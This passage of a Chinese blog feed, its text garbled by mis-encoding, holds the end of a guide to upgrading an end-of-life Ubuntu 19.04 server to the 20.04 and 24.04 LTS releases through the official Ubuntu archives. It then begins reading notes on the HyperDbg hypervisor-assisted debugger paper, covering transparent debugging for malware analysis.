id="0x01-ä»-Ubuntu-19-04-å‡çº§åˆ°-LTS-ç‰ˆæœ¬"><a href="#0x01-ä»-Ubuntu-19-04-å‡çº§åˆ°-LTS-ç‰ˆæœ¬" class="headerlink" title="0x01. ä» Ubuntu 19.04 å‡çº§åˆ° LTS ç‰ˆæœ¬"></a>0x01. ä» Ubuntu 19.04 å‡çº§åˆ° LTS ç‰ˆæœ¬</h1><blockquote><p>æ³¨ï¼šç†è®ºä¸Šåº”å½“ä¸ä»…é€‚ç”¨äº 19.04ï¼Œè€Œåº”å½“ä¹Ÿé€‚ç”¨äºå…¶ä»–çŸ­å‘½ç‰ˆæœ¬</p><p>æ³¨2ï¼šå¦‚æœä½ çš„ç½‘ç»œè¿æ¥ä¼¼ä¹æ²¡æœ‰é‚£ä¹ˆç¨³å®šï¼Œè¯·åœ¨ <em>åˆ†ç¦»å¼ç»ˆç«¯</em> ï¼ˆä¾‹å¦‚ tmux ï¼‰ä¸­è¿›è¡Œè¿™ä¸€ç³»åˆ—æ“ä½œï¼Œä»¥é¿å…å‡çº§åˆ°ä¸€åŠæ–­è¿äº†ä»»åŠ¡ä¸­æ–­äº†å¯¼è‡´ç³»ç»Ÿç¯å¢ƒç›´æ¥ç‚¸äº†</p></blockquote><h2 id="æ¢å¤-19-04-Disco-å¯ç”¨æ€§"><a href="#æ¢å¤-19-04-Disco-å¯ç”¨æ€§" class="headerlink" title="æ¢å¤ 19.04 Disco å¯ç”¨æ€§"></a>æ¢å¤ 19.04 Disco å¯ç”¨æ€§</h2><p>é¦–å…ˆå¤‡ä»½ä¸€ä¸‹åŸæ¥çš„æºï¼Œè™½ç„¶è¯´è¿™ä¸ªæºå·²ç»æ²¡ä»€ä¹ˆç”¨äº†ä½†æ˜¯è¿˜æ˜¯å¸Œæœ›èƒ½åœ¨ä¸‡ä¸€å¤±è´¥çš„æƒ…å†µä¸‹ <em>æ¢å¤æ¡ˆå‘åŸç°åœº</em> ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo <span class="hljs-built_in">cp</span> /etc/apt/sources.list /etc/apt/sources.list.bak</span><br></code></pre></td></tr></table></figure><p>ç„¶åæŠŠè½¯ä»¶æºé‡Œçš„è€æºæ¢æˆ <code>old-releases.ubuntu.com</code> :</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo sed -i -e <span class="hljs-string">&#x27;s/cn.archive.ubuntu.com/old-releases.ubuntu.com/g&#x27;</span> /etc/apt/sources.list</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo sed -i -e <span class="hljs-string">&#x27;s/security.ubuntu.com/old-releases.ubuntu.com/g&#x27;</span> /etc/apt/sources.list</span><br></code></pre></td></tr></table></figure><p>ç°åœ¨å¯ä»¥å¼€å§‹è¿›è¡Œä¼ ç»Ÿç³»ç»Ÿæ›´æ–°äº†ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo apt-get update</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo apt-get upgrade</span><br></code></pre></td></tr></table></figure><blockquote><p>ä¹‹åå°±å¯ä»¥æ­£å¸¸å®‰è£…è½¯ä»¶äº†ï¼Œè¿™é‡Œç¬”è€…å…ˆå®‰äº†ä¸€ä¸ª sshdï¼Œå› ä¸ºéå¸¸å¥‡å¼‚æç¬‘çš„æ˜¯ç¬”è€…æ‹¿åˆ°çš„æœåŠ¡å™¨ä¸Šè¾¹å±…ç„¶æ²¡æœ‰å®‰è£… sshdï¼Œè€Œæ˜¯ä½¿ç”¨ ToDesk è¿›è¡Œè¿œç¨‹è¿æ¥ï¼ˆ <del>ä¸çŸ¥é“åŸè¿ç»´äººå‘˜æ€ä¹ˆæƒ³çš„ï¼Œå®‰è¿™ç§ç”Ÿå‘½å‘¨æœŸåªæœ‰ 9 ä¸ªæœˆçš„ç‰ˆæœ¬ä¹Ÿå°±ç®—äº†æœåŠ¡å™¨ä¸Šè¿åŸºç¡€è®¾æ–½å»ºè®¾éƒ½æ²¡æœ‰</del> ï¼‰ï¼Œä¸‡å¹¸çš„æ˜¯ç¬”è€…è¿˜æœ‰å†…ç½‘ä¸­å¦ä¸€å°æœºå™¨çš„æ§åˆ¶æƒï¼Œå› æ­¤æœ‰ sshd çš„è¯å°±ç®—ä¸‡ä¸€ ToDesk æ²¡æ³•æ­£å¸¸è‡ªå¯åŠ¨ç¬”è€…ä¹Ÿèƒ½æ­£å¸¸è¿æ¥è¿›å»ï¼ˆ<strong>äº‹å®è¯æ˜ ToDesk åœ¨é‡å¯ä¹‹åç¡®å®æ²¡æ³•ç›´æ¥é‡æ–°è¿æ¥</strong> ï¼Œè™½ç„¶åœ¨ systemctl é‡Œçœ‹è¿™ä¸ªæœåŠ¡ä¼¼ä¹ä»æ˜¯æ­£å¸¸è¿è¡Œçš„ï¼‰</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo apt-get install -y openssh-server</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo systemctl <span class="hljs-built_in">enable</span> --now sshd.service</span><br></code></pre></td></tr></table></figure></blockquote><p>å¤„ç†è½¯ä»¶åŒ…é—´ä¾èµ–ï¼Œç„¶åé‡å¯ç³»ç»Ÿï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo apt-get update</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo apt-get dist-upgrade</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo reboot</span><br></code></pre></td></tr></table></figure><h2 id="ä»-19-04-Disco-å‡çº§è‡³-19-10-Eoan"><a href="#ä»-19-04-Disco-å‡çº§è‡³-19-10-Eoan" class="headerlink" title="ä» 19.04 Disco å‡çº§è‡³ 19.10 Eoan"></a>ä» 19.04 Disco å‡çº§è‡³ 19.10 Eoan</h2><p>ç¬”è€…æœ¬ä»¥ä¸ºå¯ä»¥ç›´æ¥ <code>do-release-upgrade</code>  ä» 19.04 å‡çº§åˆ° 20.04 LTS ç„¶åå†ç»§ç»­å‡çº§ï¼š</p><p><img src="https://s2.loli.net/2024/10/10/LXoTc2enaBRtOir.png"></p><p>æ²¡æœ‰æƒ³åˆ°çš„æ˜¯è¿™ä¸ªå‡çº§å·¥å…·å¹¶ä¸æ”¯æŒï¼š</p><p><img src="https://s2.loli.net/2024/10/10/At5dqCYpEiUxsSa.png" alt="image.png"></p><p>å› æ­¤æˆ‘ä»¬éœ€è¦å…ˆå‡çº§åˆ°ä¸‹ä¸€ä¸ª <del>çŸ­å‘½</del> ç‰ˆæœ¬ <code>19.10</code> ï¼Œé¦–å…ˆ <strong>æ‰‹åŠ¨</strong> å°†è½¯ä»¶æºä» <code>19.04</code> æ¢ä¸º <code>19.10</code> ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo sed -i -e <span class="hljs-string">&#x27;s/disco/eoan/g&#x27;</span> /etc/apt/sources.list</span><br></code></pre></td></tr></table></figure><p>ç„¶åæ›´æ–°ç³»ç»Ÿï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo apt-get update</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo apt-get upgrade</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo apt-get dist-upgrade</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo reboot</span><br></code></pre></td></tr></table></figure><blockquote><p>å¯èƒ½ä¼šæœ‰äººè®¤ä¸ºä¸‡å¹¸çš„æ˜¯æˆ‘ä»¬è¿˜æœ‰ <strong>æ‰‹åŠ¨è¿›è¡Œè‡ªåŠ¨å‡çº§</strong> è¿™ä¸€æ¡è·¯å¯ä»¥èµ°ï¼Œå³é¦–å…ˆå‰å¾€ <a href="https://changelogs.ubuntu.com/meta-release">https://changelogs.ubuntu.com/meta-release</a> æ‰¾åˆ° <code>19.04</code> çš„ä¸‹ä¸€ä¸ªç‰ˆæœ¬ <code>19.10</code> ï¼š</p><p><img src="https://s2.loli.net/2024/10/10/X7YNw1zSgbLxPQC.png"></p><p>ä¸‹è½½ 19.10 çš„å‡çº§å·¥å…·ï¼Œè§£å‹ï¼Œè¿è¡Œï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">wget http://old-releases.ubuntu.com/ubuntu/dists/eoan-updates/main/dist-upgrader-all/current/eoan.tar.gz</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">mkdir</span> eoan</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">mv</span> eoan.tar.gz eoan/</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cd</span> ./eoan</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">tar -zxvf eoan.tar.gz</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo ./eoan</span><br></code></pre></td></tr></table></figure><p>ç„¶åå°± segmentation fault äº†ï¼Œå› æ­¤è¿™ä¸ªæ–¹æ³•è‡³å°‘åœ¨ç¬”è€…æ‰‹ä¸Šçš„æœåŠ¡å™¨ä¸Šä¼¼ä¹æ˜¯ä¸å¤ªå¯è¡Œçš„ï¼š</p><p><img src="https://s2.loli.net/2024/10/10/XHrs49tWSpbcImP.png"></p></blockquote><h2 id="ä»-19-10-å‡çº§è‡³-20-04-LTS"><a href="#ä»-19-10-å‡çº§è‡³-20-04-LTS" class="headerlink" title="ä» 19.10 å‡çº§è‡³ 20.04 LTS"></a>ä» 19.10 å‡çº§è‡³ 20.04 LTS</h2><p>ä¸‡äº‹ä¿±å¤‡ï¼Œç°åœ¨è®©æˆ‘ä»¬è¿ˆå‘ä¸‹ä¸€ä¸ªå‘è¡Œç‰ˆæœ¬ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo do-release-upgrade</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo reboot</span><br></code></pre></td></tr></table></figure><p>æˆåŠŸå‡çº§è‡³ 20.04 LTS ç‰ˆæœ¬ï¼š</p><p><img src="https://s2.loli.net/2024/10/10/mP4GTkSr5y2zsKO.png"></p><blockquote><p>ä¸ºä»€ä¹ˆæˆªå›¾ä¸Šæ˜¯ç”¨å¯†ç ç™»å½•æ˜¯å› ä¸ºç¬”è€…æ‹¿åˆ°æœåŠ¡å™¨åç¬¬ä¸€æ—¶é—´æƒ³çš„å…ˆæ˜¯å‡çº§ï¼Œå› æ­¤è¿˜æ²¡æœ‰é…ç½®å¯†é’¥ç™»å½•ï¼Œ <del>åŒæ—¶ä¹Ÿå¯ä»¥çœ‹å‡ºåŸè¿ç»´å¹¶æ²¡æœ‰æŠŠ sshd çš„å¯†ç ç™»å½•ç»™å…³é—­</del></p></blockquote><h2 id="ä»-20-04-å‡çº§åˆ°-24-04"><a href="#ä»-20-04-å‡çº§åˆ°-24-04" class="headerlink" title="ä» 20.04 å‡çº§åˆ° 24.04"></a>ä» 20.04 å‡çº§åˆ° 24.04</h2><p>å¦‚æœæƒ³è¦ç»§ç»­å‡çº§åˆ°æ›´æ–°çš„ç³»ç»Ÿç‰ˆæœ¬ï¼Œç»§ç»­ä¸€è·¯è¿è¡Œ <code>sudo do-release-upgrade</code> å³å¯ï¼š</p><p><img src="https://s2.loli.net/2024/10/10/WEax5DQP1LJt67R.png"></p><h1 id="0xFF-REFERENCE"><a href="#0xFF-REFERENCE" class="headerlink" title="0xFF. REFERENCE"></a>0xFF. REFERENCE</h1><p>æ„Ÿè°¢ <code>Ask Ubuntu</code> ç¤¾åŒºæä¾›çš„æ ¸å¿ƒè§£å†³æ–¹æ¡ˆï¼š</p><p><a href="https://askubuntu.com/questions/1260939/cannot-upgrade-from-disco-19-04-to-focal-20-04-after-end-of-life-using-do-releas">Ask Ubuntu - Cannot upgrade from disco 19.04 to focal 20.04 after end of life using do-release-upgrade method</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;æ¬¸ä½ æ€ä¹ˆæ­»äº†ï¼ˆæŒ‡ EOL Releaseï¼‰&lt;/p&gt;</summary>
    
    
    
    <category term="OPS" scheme="https://arttnba3.github.io/categories/OPS/"/>
    
    
    <category term="Linux" scheme="https://arttnba3.github.io/tags/Linux/"/>
    
    <category term="è¿ç»´" scheme="https://arttnba3.github.io/tags/%E8%BF%90%E7%BB%B4/"/>
    
  </entry>
  
  <entry>
    <title>ã€PAPER.0x08ã€‘è®ºæ–‡ç¬”è®°ï¼šHyperDbg: Reinventing Hardware-Assisted Debugging</title>
    <link href="https://arttnba3.github.io/2024/08/31/PAPER-0X08-HYPERDBG/"/>
    <id>https://arttnba3.github.io/2024/08/31/PAPER-0X08-HYPERDBG/</id>
    <published>2024-08-30T18:59:36.000Z</published>
    <updated>2025-04-11T15:17:17.224Z</updated>
    
    <content type="html"><![CDATA[<p>çŒ«çŒ«å¸®ä½ è°ƒè¯•ç¨‹åºï¼ŒçŒ«å¥½ï¼Œäººç±»å¥´å½¹çŒ«çŒ«ï¼Œäººå</p><span id="more"></span><h1 id="0x00-ä¸€åˆ‡å¼€å§‹ä¹‹å‰"><a href="#0x00-ä¸€åˆ‡å¼€å§‹ä¹‹å‰" class="headerlink" title="0x00. ä¸€åˆ‡å¼€å§‹ä¹‹å‰"></a>0x00. ä¸€åˆ‡å¼€å§‹ä¹‹å‰</h1><p>ç¬”è€…æœ€è¿‘ä¾ç„¶åœ¨åšè™šæ‹ŸåŒ–ç›¸å…³çš„å·¥ä½œï¼ˆå› ä¸ºè¿™ä¸ªå·¥ä½œä¸€ç›´åšä¸€ç›´æ‘¸é±¼æ‰€ä»¥ä¸€ç›´æ²¡åšå®Œå–µï¼‰ï¼Œæ‰€ä»¥è¿˜æ˜¯å†ç®€å•çœ‹ç‚¹ç›¸å…³çš„è®ºæ–‡ç»§ç»­åˆ’åˆ’æ°´è¿™æ ·å­</p><p>è¿™ä¸€æ¬¡çœ‹çš„æ˜¯ä¸€ä¸ªæ¶æ„æ¯”è¾ƒå¤æ‚ä½†æ˜¯æŒºæœ‰åçš„å¼€æºé¡¹ç›®â€”â€”<a href="https://github.com/HyperDbg/HyperDbg">HyperDbg</a> çš„è®ºæ–‡ï¼šï¼‰</p><h2 id="Abstract"><a href="#Abstract" class="headerlink" title="Abstract"></a>Abstract</h2><p>ç°åœ¨çš„è°ƒè¯•å¹³å°éƒ½ç”±äºå„ç§é™åˆ¶æ— æ³•æä¾›é€æ˜ã€é«˜æ•ˆã€é«˜æ€§èƒ½çš„ low-level è°ƒè¯•å™¨ï¼Œè¿™ç¯‡è®ºæ–‡ç»™å‡ºäº†ä¸€ä¸ªä½¿ç”¨è™šæ‹ŸåŒ–æŠ€æœ¯è¾…åŠ©çš„è°ƒè¯•å™¨ï¼Œå…¶åŸºäºä¸€ä¸ªè‡ªå®šä¹‰çš„è™šæ‹Ÿæœºï¼ˆ<del>ç¬”è€…ï¼šæ€ä¹ˆéƒ½è¿™ä¹ˆå–œæ¬¢è‡ªå·±å†™è™šæ‹Ÿæœº</del>ï¼‰ï¼Œå¹¶é€šè¿‡ EPT è¿›è¡ŒåŸºäºç¡¬ä»¶çš„æŒ‡ä»¤çº§æ¨¡æ‹Ÿä¸ç³»ç»Ÿçº§ API åŠ«æŒï¼ŒåŒæ—¶é€šè¿‡éƒ¨ç½²ä¸€ä¸ªä¸ VMX å…¼å®¹çš„è„šæœ¬å¼•æ“æ¶ˆé™¤äº†ä¸å¿…è¦çš„ä¸Šä¸‹æ–‡åˆ‡æ¢ï¼Œå®éªŒç»“æœè¡¨æ˜ hyperdbg çš„éšç§˜æ€§ä½¿å…¶æ¯” WinDbg å’Œ x64dbg èƒ½è°ƒè¯•æ›´å¤šçš„è½¯ä»¶æ ·æœ¬ï¼Œä¸”è°ƒè¯•é€Ÿåº¦æ¯” WinDbg å¿«å¾—å¤š</p><h2 id="CCS-Concepts"><a href="#CCS-Concepts" class="headerlink" title="CCS Concepts"></a>CCS Concepts</h2><p>â€¢ Security and privacy â†’ Software reverse engineering; Virtualization and security; Software security engineering; â€¢ Software and its engineering â†’ Compilers.</p><h2 id="Keywords"><a href="#Keywords" class="headerlink" title="Keywords"></a>Keywords</h2><p>Hypervisor, Debugging, Kernel-debugger, Fuzzing, Malware-analysis</p><h1 id="0x01-INTRODUCTION"><a href="#0x01-INTRODUCTION" class="headerlink" title="0x01. INTRODUCTION"></a>0x01. INTRODUCTION</h1><p>è°ƒè¯•å™¨ï¼ˆdebuggerï¼‰æ˜¯è¾…åŠ©è½¯ä»¶å¼€å‘ã€è½¯ä»¶é€†å‘å·¥ç¨‹ä¸æ¶æ„è½¯ä»¶åˆ†æä¸­çš„ä¸€ä¸ªé‡è¦å·¥å…·ï¼Œä½†ç°ä»£è½¯ä»¶éƒ½æœ‰ç€åè™šæ‹ŸåŒ–ã€åæ¨¡æ‹Ÿã€æŒ‡çº¹æ£€æµ‹ç­‰æŠ€æœ¯ï¼ˆå¦‚è°ƒç”¨ç‰¹å®šçš„ OS APIsï¼‰æ¥å¯¹æŠ—è°ƒè¯•ï¼Œè€Œç°æœ‰çš„è°ƒè¯•å·¥å…·éƒ½ç¼ºä¹ç›¸åº”çš„å¯¹æŠ—èƒ½åŠ›ï¼Œä¸æ­¤åŒæ—¶ä¸€ä»½å¯¹ 4ç™¾ä¸‡æ¶æ„è½¯ä»¶çš„è°ƒæŸ¥æ˜¾ç¤ºå…¶ä¸­ 88% éƒ½è£…å¤‡äº†åé€†å‘æŠ€æœ¯ã€81%è£…å¤‡äº†åè°ƒè¯•æˆ–åè™šæ‹ŸåŒ–æŠ€æœ¯ï¼ŒOS APIs æˆ–æ˜¯ ring-0 çš„é€‰é¡¹ä½¿å¾—é«˜æƒé™çš„æ¶æ„è½¯ä»¶å¯ä»¥æ£€æµ‹åˆ°è°ƒè¯•å™¨çš„å­˜åœ¨</p><blockquote><p>ç¬”è€…æ³¨ï¼šä¾‹å¦‚æœ€å¸¸è§çš„ä¸€ä¸ªæ£€æµ‹æ–¹å¼å°±æ˜¯æŒ‡ä»¤æ‰§è¡Œæ—¶é—´ï¼Œä¾‹å¦‚ <code>cpuid</code> æŒ‡ä»¤åœ¨æ¨¡æ‹Ÿæ‰§è¡Œä¸‹çš„æ€»æ—¶é•¿åœ¨è™šæ‹Ÿæœºä¸­ä¼šæ¯”ç‰©ç†æœºä¸Šé«˜ä¸å°‘</p></blockquote><p>å› æ­¤ç ”ç©¶äººå‘˜å°†ç›®å…‰æ”¾åˆ°ç¡¬ä»¶ä¸Šï¼Œè£¸é‡‘å±ã€hypervisor-levelã€ç³»ç»Ÿç®¡ç†æ¨¡å¼ï¼ˆSystem Management Modeï¼‰ç”šè‡³æ˜¯ Intel å†…å­˜ç®¡ç†å¼•æ“ï¼ˆMemory Management Engineï¼‰éƒ½è¢«ç”¨æ¥å¢åŠ è°ƒè¯•å™¨çš„é€æ˜åº¦ï¼Œä½†ä¹Ÿé€ æˆäº†è¾ƒé«˜çš„æ€§èƒ½æŸè€—ï¼Œæ­¤å‰æå‡ºçš„å­å†…æ ¸è°ƒè¯•å™¨è™½å¼ºä½†ä¹Ÿæœªèƒ½æä¾›ä¸°å¯Œçš„è°ƒè¯•åŠŸèƒ½ï¼Œä¸”å¤§éƒ½åœæ­¢æ›´æ–°æˆ–ä»…ä¸ºå­¦æœ¯ç›®çš„è€Œå¼€å‘ï¼Œæ­¤å¤–ç¤¾åŒºä¹Ÿè¦æ±‚è¿™ç±»å·¥å…·æä¾›æºç </p><p>æœ¬æ–‡ç»™å‡º <a href="https://github.com/HyperDbg/HyperDbg">HYPERDBG</a> ï¼šåŸºäº VMM &amp;  Intel VT-x  çš„ debuggerï¼Œå…¶é¿å…ä½¿ç”¨ä»»ä½• OS API æˆ–è½¯ä»¶è°ƒè¯•æœºåˆ¶ï¼Œè€Œæ˜¯å¹¿æ³›ä½¿ç”¨å¤„ç†å™¨åŠŸèƒ½ï¼ˆå¦‚ EPTï¼‰æ¥ç›‘è§†ç¨‹åºæ‰§è¡Œï¼Œä»è€Œæé«˜äº†æ‰§è¡Œé€æ˜æ€§ï¼Œå¹¶ä½¿å¾— HyperDbg å¯ä»¥ä½¿ç”¨ SOTA æŠ€æœ¯ï¼ˆå¦‚ hidden hookï¼Œä¸ inline hook ä¸€æ ·å¿«ï¼‰ï¼Œä»¥åŠæ”¯æŒç¡¬ä»¶è°ƒè¯•æ–­ç‚¹ä»¥åœ¨å¯¹ç‰¹å®šä½ç½®çš„è¯»å†™ä¸‹æ–­ï¼›ä½œè€…åœ¨ 13 ä¸ªæ‰“åŒ…å™¨ä¸ä¿æŠ¤å™¨ä¸Šè¿›è¡Œäº†æµ‹è¯•ï¼Œæ²¡æœ‰ä¸€ä¸ªæ£€æµ‹åˆ°äº† HYPERDBGï¼Œè¶…è¶Šç°æœ‰çš„å…¶ä»–è°ƒè¯•å™¨ï¼›ä½œè€…åœ¨ 10853 ä¸ªæ¶æ„è½¯ä»¶ä¸Šå±•ç¤ºäº†é€æ˜è°ƒè¯•çš„é€‚ç”¨æ€§ï¼ŒæˆåŠŸåˆ†æçš„æ¶æ„æ ·æœ¬æ•°é‡åˆ†åˆ«è¶…è¿‡ WinDbg 22%ã€ x64dbg 26%ï¼›ä½œè€…è¿˜æè¿°äº†ä½¿ç”¨ HYPERDBG å¯¹ä¸€ä¸ª Windows kernel 0 day çš„é‡æ–°å‘ç°</p><p>å¯¹äºé«˜æ€§èƒ½è°ƒè¯•ï¼ŒHYPERDBG ä½¿ç”¨ä¸ VMX-root å…¼å®¹çš„è„šæœ¬å¼•æ“æ¥åœ¨å†…æ ¸æ¨¡å¼æ‰§è¡Œæ•´ä¸ªå¤æ‚çš„è°ƒè¯•åŠŸèƒ½ï¼Œå…¶è„šæœ¬æ¶ˆé™¤äº†ç”¨æˆ·åˆ°å†…æ ¸çš„äº¤äº’ä¸”æä¾›äº†å·¨å¤§çš„è°ƒè¯•æ€§èƒ½ï¼Œä½œè€…åœ¨å•æ­¥æ‰§è¡Œã€æ¡ä»¶ä¸­æ–­ã€ç³»ç»Ÿè°ƒç”¨è®°å½•ä¸­è¯„ä¼°äº† HYPERDBGï¼Œä¸ WinDbg ç›¸æ¯”åˆ†åˆ«å¿«äº† 2.98ã€1319ã€2018 å€</p><p>ä½œè€…å±•ç¤ºäº† HYPERDBG çš„è®¾è®¡å¾ˆ ğŸ®ğŸºï¼Œç®€è€Œè¨€ä¹‹æœ¬æ–‡è´¡çŒ®å¦‚ä¸‹ï¼š</p><ul><li>ä½œè€…å±•ç¤ºäº† HYPERDBGï¼Œä¸€ä¸ªä¸ºæ·±åº¦è½¯ä»¶åˆ†æã€é€†å‘å·¥ç¨‹ã€éšç§˜ fuzzing è€Œç‰¹åŒ–çš„ hypervisor è¾…åŠ©çš„è°ƒè¯•å™¨</li><li>ä½œè€…å¼•å…¥äº† VMX-root å…¼å®¹çš„è„šæœ¬å¼•æ“ï¼Œæ¯” SOTA è°ƒè¯•å™¨å¿«å‡ ä¸ªæ•°é‡çº§</li><li>ä½œè€…åœ¨ 10853 æ¶æ„è½¯ä»¶ä¸­è¯æ˜äº† HYPERDBG çš„é€æ˜è°ƒè¯•ï¼Œæ¯” SOTA è°ƒè¯•å™¨èƒ½å¤šåˆ†æ 22%~26% çš„æ ·æœ¬</li><li>ä½œè€…æè¿°äº† HYPERDBG çš„å¤šç§åº”ç”¨ï¼Œå¦‚å¤§è§„æ¨¡ä¸å¿«é€Ÿæ¶æ„è½¯ä»¶åˆ†æï¼ˆåŒ…æ‹¬ Windows 0-day åˆ†æï¼‰ã€fuzzing ä¸­çš„ä»£ç è¦†ç›–ç‡ã€IO è®¾å¤‡è°ƒè¯•ã€è½¯ä»¶æ€§èƒ½æµ‹é‡</li></ul><p>ä½œè€…çš„ä»£ç å¼€æºäº <a href="https://github.com/HyperDbg/HyperDbg">https://github.com/HyperDbg/HyperDbg</a></p><h1 id="0x02-TECHNICAL-BACKGROUND"><a href="#0x02-TECHNICAL-BACKGROUND" class="headerlink" title="0x02. TECHNICAL BACKGROUND"></a>0x02. TECHNICAL BACKGROUND</h1><p>æœ¬èŠ‚ä»‹ç»æ‰€éœ€çš„æŠ€æœ¯èƒŒæ™¯çŸ¥è¯†</p><h2 id="2-1-Modern-Debuggers"><a href="#2-1-Modern-Debuggers" class="headerlink" title="2.1 Modern Debuggers"></a>2.1 Modern Debuggers</h2><p>è°ƒè¯•ï¼ˆdebuggingï¼‰ç”¨äºæ£€æŸ¥ä¸åˆ†æè½¯ä»¶ç¨‹åºè¿‡ç¨‹ï¼Œé€æ­¥æ‰§è¡Œã€å†…å­˜è§‚æµ‹ä¸ä¿®æ”¹ã€æ–­ç‚¹ç­‰éƒ½æ˜¯è°ƒè¯•å™¨çš„é‡è¦ç‰¹æ€§ï¼Œè°ƒè¯•å™¨å¯è¢«åˆ†ä¸ºç”¨æˆ·æ¨¡å¼ï¼ˆå¦‚ x64dbgã€Ollydbgï¼‰ä¸å†…æ ¸æ¨¡å¼ï¼ˆå¦‚ WinDbgã€GDBï¼‰ä¸¤ç±»ï¼Œéšç€æ¶æ„è½¯ä»¶æŠ€æœ¯è¿›æ­¥ï¼Œç ”ç©¶äººå‘˜å¼€å§‹å¯¹èƒ½æä¾›æ›´é€æ˜ç¯å¢ƒçš„è™šæ‹ŸåŒ–ã€ç¡¬ä»¶è¾…åŠ©æ–¹æ³•æ„Ÿå…´è¶£</p><h2 id="2-2-Instruction-Set-Architecture-ISA-Extensions"><a href="#2-2-Instruction-Set-Architecture-ISA-Extensions" class="headerlink" title="2.2 Instruction Set Architecture (ISA) Extensions"></a>2.2 Instruction Set Architecture (ISA) Extensions</h2><p>æœ¬èŠ‚ä¸»è¦ä»‹ç» Intel ç›¸å…³æ‰©å±•ï¼ŒHYPERDBG æš‚æ—¶ä¹Ÿåªæ”¯æŒ Intel å¤„ç†å™¨</p><ul><li>Intel Virtualization Technologyï¼ˆVT-xï¼‰ï¼šIntel çš„ç¡¬ä»¶è¾…åŠ©è™šæ‹ŸåŒ–æŠ€æœ¯ï¼Œæ—¨åœ¨ç®€åŒ–è™šæ‹ŸåŒ–è¿‡ç¨‹å¹¶æé«˜ VMM æ€§èƒ½ï¼Œå…¶å…è®¸ä¸€ä¸ªæ ¸å¿ƒè¢«å½“ä½œå¤šä¸ªæ ¸å¿ƒè¿è¡Œ</li><li>Intel Extended Page Table ï¼ˆEPTï¼‰ï¼šIntel VT-x ä¸­çš„ç¡¬ä»¶è¾…åŠ©çš„ MMUï¼Œå…¶é€šè¿‡ EPT æä¾›äº† GPA åˆ° HPA çš„è½¬æ¢ä»¥æ¶ˆé™¤è½¯ä»¶ç®¡ç†çš„å½±å­é¡µè¡¨çš„å¼€é”€ï¼Œæ¯ä¸ª Intel æ ¸å¿ƒéƒ½æœ‰ä¸€ä¸ª EPT è¡¨ï¼Œä»¥å…è®¸å¤šä¸ªä¸åŒç‹¬ç«‹ç³»ç»Ÿå¹¶è¡Œè®¿é—®</li><li>Intel Transactional Synchronization Extensionsï¼ˆTSXï¼‰ï¼šTSX ä¸º x86 çš„ä¸€ç»„æŒ‡ä»¤é›†æ‰©å±•ï¼ŒåŒ…æ‹¬ Restricted Transactional Memoryï¼Œè¿™å…è®¸å¯¹ç¡¬ä»¶äº‹åŠ¡æ€§çš„æ”¯æŒï¼ˆå¦‚äº‹åŠ¡æ“ä½œå¤±è´¥åˆ™å›æ»šï¼‰ï¼Œæœ¬æ–‡ä¸­çš„ Intel TSX ç‰¹æŒ‡ RTM</li></ul><h2 id="2-3-Terminology"><a href="#2-3-Terminology" class="headerlink" title="2.3 Terminology"></a>2.3 Terminology</h2><p>ä½œè€…çš„å®ç°åŸºäº Intel å¤„ç†å™¨ï¼Œç›®æ ‡ OS ä¸º Microsoft Windows</p><ul><li>Hypervisorï¼šé€šè¿‡è™šæ‹Ÿå…±äº«èµ„æºå®ç°è™šæ‹ŸåŒ–çš„è½¯ä»¶ï¼Œé€šè¿‡æŠ½è±¡ç¡¬ä»¶èµ„æºä»¥è¿è¡Œè™šæ‹Ÿæœº</li><li>Interrupt Request Level ï¼ˆIRQLï¼‰ï¼šWindows ç‹¬ç«‹äºç¡¬ä»¶çš„ä¸­æ–­ä¸ä»£ç ä¼˜å…ˆçº§æ’åºæœºåˆ¶ï¼Œé«˜ IRQL 